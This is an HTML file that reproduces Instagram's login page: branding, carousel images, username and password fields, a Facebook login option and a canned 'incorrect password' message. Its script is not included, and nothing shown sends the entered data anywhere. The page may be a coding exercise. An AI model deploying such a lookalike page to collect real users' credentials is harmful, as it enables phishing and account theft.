<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="./css/style.css">
</head>
<body class="center">
    <main class="main center">
        <div class="container spacebtw">
            <div class="imageChange">

                <div class="iphone1">
                    <img src="./img/iphone-frame.png" alt="" srcset="">
                </div> 
                <div class="iphone2">
                    <img src="./img/iphone-frame2.png" alt="" srcset="">
                    <img src="./img/frame1-img1.png" alt="" srcset="">
                </div> 
                <div class="changeImg">
                    <img src="./img/frame2-img1.png" alt="" class="fadingImages imgCarouselStyle"> 
                    <img src="./img/frame2-img2.png" alt="" class="fadingImages imgCarouselStyle" style="opacity: 1;"> 
                    <img src="./img/frame2-img3.png" alt="" class="fadingImages imgCarouselStyle"> 
                    <img src="./img/frame2-img4.png" alt="" class="fadingImages imgCarouselStyle">
                </div>
             </div>
            <div class="form-sign-up">
                <div class="column form-container center">
                    <div class="logo">
                        <img src="./img/insta-logo.png" width="200px" alt="">
                    </div>
                    <form action="" class="form w-100">
                        <div class="form-group w-100">
                            <label for="" id="emailLabel">Phone number, username or email address</label>
                            <input type="text" name="" id="email">
                        </div>
                        <div class="form-group w-100">
                            <label for="" id="passwordLabel">Password</label>
                            <input type="password" name="" id="password">
                            <span id="showOrHide" class="text-white" style="display: none;font-size: 12px;width: 30px;position: absolute;top: 10px;right: 6px;">Show</span>
                        </div>
                        <div class="button-group w-100">
                            <button id="signIn" class="btn w-100">Log in</button>
                        </div>
                    </form>
                    <div class="w-100 or-section">
                        <span>OR</span>
                        <span class="long"></span>
                    </div>
                    <div class="space center facebook-icon" style="margin-top: 30px;">
                        <svg aria-label="Log in with Facebook" class="x1lliihq x1n2onr6 x173jzuc" fill="currentColor" height="20" role="img" viewBox="0 0 16 16" width="20">
                            <title>Log in with Facebook</title>
                            <g clip-path="url(#a)">
                                <path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="currentColor"></path>
                            </g>
                            <defs>
                                <clipPath id="a">
                                    <rect fill="currentColor" height="16" width="16"></rect>
                                </clipPath>
                            </defs>
                        </svg>
                        <span class="" style="margin-left: 10px;">Log in with Facebook</span>
                    </div>
                    <span class="err">Sorry, your password was incorrect. Please double-check your password.</span>
                    <span class="forgot-pass text-white">Forgotten your password?</span>
                </div>
                <div class="column form-container center" style="padding: 20px;">
                    <div class="sign-up">
                        <span>Don't have an account?</span>
                        <a href="" class="link">Sign up</a>
                    </div>
                </div>
                <div class="get-app text-white center" style="margin-top: 20px; font-size: 14px;flex-direction: column;">
                    <div class="get">
                        <span class="text-get">Get the app.</span>
                    </div>
                    <div class="set-cards center w-100" style="margin-top: 20px;gap: 10px;">
                        <div class="card center">
                            <img src="./img/g-play.png" height="40px" alt="">
                        </div>
                        <div class="card center">
                            <img src="./img/microsoft.png" height="40px" alt="">
                        </div>
                    </div>
                </div>
            </div>
            <!-- <small style="color:white">kdmfbgkm</small>
            <small style="color:white">kdmfbgkm</small> -->
        </div>
    </main>
<script src="./js/main.js"></script>
</body>
</html>
